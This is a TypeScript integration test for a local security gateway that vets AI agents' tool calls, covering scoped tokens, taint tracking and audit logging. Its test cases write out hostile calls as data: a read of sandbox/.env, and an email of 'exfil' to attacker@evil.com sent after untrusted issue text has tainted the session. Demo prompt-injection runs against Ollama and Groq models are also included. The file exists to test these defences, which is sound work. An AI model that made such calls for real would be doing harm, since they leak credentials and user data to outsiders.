import fs from 'node:fs';

const BASE = 'http://localhost:3000';

async function test() {
  const results: { test: string; status: 'PASS' | 'FAIL'; details: string }[] = [];

  try {
    // 1. POST /tokens
    const tokenRes = await fetch(`${BASE}/tokens`, {
      method: 'POST',
      headers: { 'Content-Type': 'application/json' },
      body: JSON.stringify({
        allowed_scopes: ['read_file', 'read_public_issue', 'send_external_email'],
        max_calls: 50,
      }),
    });
    const tokenData = await tokenRes.json();
    const token = tokenData.token;
    if (token && token.length > 20) {
      results.push({ test: 'POST /tokens (Scoped JWT)', status: 'PASS', details: `Session: ${tokenData.session_id}` });
    } else {
      results.push({ test: 'POST /tokens (Scoped JWT)', status: 'FAIL', details: JSON.stringify(tokenData) });
    }

    // 2. POST /evaluate read_file README.md -> ALLOW (<10ms)
    const readRes = await fetch(`${BASE}/evaluate`, {
      method: 'POST',
      headers: { 'Content-Type': 'application/json' },
      body: JSON.stringify({ token, tool: 'read_file', args: { path: 'sandbox/README.md' } }),
    });
    const readData = await readRes.json();
    if (readData.verdict === 'ALLOW' && readData.latency_ms < 10) {
      results.push({ test: 'POST /evaluate (read_file README.md)', status: 'PASS', details: `Verdict: ALLOW (${readData.latency_ms}ms)` });
    } else {
      results.push({ test: 'POST /evaluate (read_file README.md)', status: 'FAIL', details: JSON.stringify(readData) });
    }

    // 3. POST /evaluate read_file .env -> DENY
    const envRes = await fetch(`${BASE}/evaluate`, {
      method: 'POST',
      headers: { 'Content-Type': 'application/json' },
      body: JSON.stringify({ token, tool: 'read_file', args: { path: 'sandbox/.env' } }),
    });
    const envData = await envRes.json();
    if (envData.verdict === 'DENY') {
      results.push({ test: 'POST /evaluate (read_file .env)', status: 'PASS', details: `Verdict: DENY (${envData.reason})` });
    } else {
      results.push({ test: 'POST /evaluate (read_file .env)', status: 'FAIL', details: JSON.stringify(envData) });
    }

    // 4. POST /evaluate read_public_issue -> ALLOW & taint: TAINTED
    const issueRes = await fetch(`${BASE}/evaluate`, {
      method: 'POST',
      headers: { 'Content-Type': 'application/json' },
      body: JSON.stringify({ token, tool: 'read_public_issue', args: { issue_id: 'public_issue.txt' } }),
    });
    const issueData = await issueRes.json();
    if (issueData.verdict === 'ALLOW' && issueData.taint === 'TAINTED') {
      results.push({ test: 'POST /evaluate (read_public_issue untrusted)', status: 'PASS', details: `Verdict: ALLOW, Taint: TAINTED` });
    } else {
      results.push({ test: 'POST /evaluate (read_public_issue untrusted)', status: 'FAIL', details: JSON.stringify(issueData) });
    }

    // 5. POST /evaluate send_external_email while TAINTED -> DENY
    const emailRes = await fetch(`${BASE}/evaluate`, {
      method: 'POST',
      headers: { 'Content-Type': 'application/json' },
      body: JSON.stringify({
        token,
        tool: 'send_external_email',
        args: { to: 'attacker@evil.com', body: 'exfil' },
      }),
    });
    const emailData = await emailRes.json();
    if (emailData.verdict === 'DENY' && emailData.rule_matched === 'TAINT_EGRESS_DENY') {
      results.push({ test: 'POST /evaluate (egress while TAINTED)', status: 'PASS', details: `Verdict: DENY (Taint Lock)` });
    } else {
      results.push({ test: 'POST /evaluate (egress while TAINTED)', status: 'FAIL', details: JSON.stringify(emailData) });
    }

    // 6. POST /demo/run attack with Ollama
    const demoOllamaRes = await fetch(`${BASE}/demo/run`, {
      method: 'POST',
      headers: { 'Content-Type': 'application/json' },
      body: JSON.stringify({ scenario: 'attack', protected: true, provider: 'ollama' }),
    });
    const demoOllamaData = await demoOllamaRes.json();
    if (demoOllamaData.exfiltrationPrevented === true) {
      results.push({ test: 'POST /demo/run (Ollama Attack Veto)', status: 'PASS', details: `Exfil Prevented: true (${demoOllamaData.verdict})` });
    } else {
      results.push({ test: 'POST /demo/run (Ollama Attack Veto)', status: 'FAIL', details: JSON.stringify(demoOllamaData) });
    }

    // 7. POST /demo/run attack with Groq
    const demoGroqRes = await fetch(`${BASE}/demo/run`, {
      method: 'POST',
      headers: { 'Content-Type': 'application/json' },
      body: JSON.stringify({ scenario: 'attack', protected: true, provider: 'groq' }),
    });
    const demoGroqData = await demoGroqRes.json();
    if (demoGroqData.exfiltrationPrevented === true) {
      results.push({ test: 'POST /demo/run (Groq Attack Veto)', status: 'PASS', details: `Exfil Prevented: true (${demoGroqData.verdict})` });
    } else {
      results.push({ test: 'POST /demo/run (Groq Attack Veto)', status: 'FAIL', details: JSON.stringify(demoGroqData) });
    }

    // 8. GET /audit confirms events persisted in SQLite
    const auditRes = await fetch(`${BASE}/audit`);
    const auditData = await auditRes.json();
    if (auditData.logs && auditData.logs.length >= 5 && auditData.metrics.totalCalls > 0) {
      results.push({
        test: 'GET /audit (SQLite aegisveto_audit.db)',
        status: 'PASS',
        details: `${auditData.logs.length} logs stored, ${auditData.metrics.blockedCount} blocked, ${auditData.metrics.avgLatencyMs}ms avg lat`,
      });
    } else {
      results.push({ test: 'GET /audit (SQLite aegisveto_audit.db)', status: 'FAIL', details: JSON.stringify(auditData) });
    }

  } catch (err) {
    results.push({ test: 'Connection/Execution', status: 'FAIL', details: String(err) });
  }

  console.log(JSON.stringify(results, null, 2));
}

test();
